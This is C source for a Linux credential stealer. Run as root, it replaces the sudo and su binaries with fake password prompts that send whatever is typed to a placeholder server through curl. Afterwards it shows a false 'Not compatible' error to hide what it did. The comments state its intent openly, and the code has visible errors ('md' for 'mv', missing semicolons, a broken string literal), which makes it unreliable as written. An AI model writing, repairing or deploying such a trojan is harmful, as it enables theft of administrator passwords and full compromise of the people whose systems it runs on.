#include <stdio.h>
#include <string.h>


/** MAIN CODE **/

int main () {

    /** CHECK ROOT **/

    if(geteuid() != 0) {
        printf("Err.: This program must be run as root.\n");
        return 0;
    }

    /** INSTALL PACKAGE.  /DEV/NULL HIDE COMMAND EXIT **/

    system("apt install curl > /dev/null 2>&1");
    system("apt-get install curl > /dev/null 2>&1");
    system("yum install curl > /dev/null 2>&1");
    system("aptitude install curl > /dev/null 2>&1");

    /**  MOVES ORIGINAL SUDO (COPY)  **/
	
    system("sudo md /usr/bin/sudo /usr/sudo") 
	    
    /**  MOVES ORIGINAL SU (COPY)  **/	   
	    
    system("sudo md /usr/bin/su /usr/su") 
	    
    /** OVERWRITE /BIN/SU WITH POISONED BASH THAT STEPS THE PASSWORDS **/
	    
    FILE *file1; 
	
    /** MALICIUS BASH, ASK FOR PASSWD, SEND TO SERVER, FIX SUDO  **/
   
    char cmmd1[200] = "#!/bin/bash \n stty -echo \n printf \"Password: \" \n read PASSWORD \n stty echo \n echo \n curl \"http://<SERVER>/<PATH>/catcher.php?pwd=$PASSWORD&code=<CODE>\" \n sudo mv /usr/su /usr/bin/su" > /dev/null 2>&1 \n";
	    file1 = fopen("/bin/su", "w");

   if(file1 == NULL) {

	printf("Err.: Try executing me again...");
	
   } else {

	fwrite(cmmd1, sizeof(cmmd1), 1, file1);

	fclose(file1);
	
   }

/** GIVE 777 **/

system("chmod 777 /bin/su > /dev/null 2>&1");


/** OVERWRITE /BIN/SU WITH POISONED BASH THAT STEPS THE PASSWORDS **/ 


   FILE *file2;
   /** MALICIUS BASH, ASK FOR PASSWD, SEND TO SERVER, FIX SUDO  **/
   char cmmd2[200] = "#!/bin/bash \n stty -echo \n printf \"Password: \" \n read PASSWORD \n stty echo \n echo \n curl \"http://<SERVER>/<PATH>/catcher.php?pwd=$PASSWORD&code=<CODE>\" \n sudo mv /usr/sudo /usr/bin/sudo > /dev/null 2>&1 \n"; 
   file2 = fopen("/usr/bin/sudo", "w");
   if(file2 == NULL) {
        printf("Err.: Try executing me again...");
     } else {
        fwrite(&cmmd2, sizeof(cmmd2), 1, file2);
        fclose(file2);
    }

    /** GIVE 777 **/system("chmod 777 /usr/bin/sudo > /dev/null 2>&1");
	
    printf("Error: Not compatible")
    printf("Exiting...")
    return(0);
} 


